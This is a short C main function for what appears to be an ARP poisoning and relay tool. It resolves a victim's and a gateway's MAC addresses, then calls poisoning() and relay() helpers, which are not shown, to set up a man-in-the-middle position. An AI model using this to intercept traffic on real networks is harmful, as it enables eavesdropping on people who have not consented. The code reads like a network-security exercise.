#include "header.h"

int main(int argc, char* argv[])
{
	if(argc != 3)
	{
		printf("send_packet [sender ip] [target ip]\n");
		return -1;
	}

	char my_mac[6];
	get_mymac(my_mac);

	unsigned char *send_packet;
	unsigned char target_mac[6];
	request(my_mac, "192.168.138.138", target_mac, argv[1]);//target:victim
	poisoning(my_mac, argv[2], target_mac, argv[1]);
 	
	request(my_mac, "192.168.138.138", target_mac, argv[2]);//target:gateway
	relay(my_mac, target_mac);
	
	return 0;
}
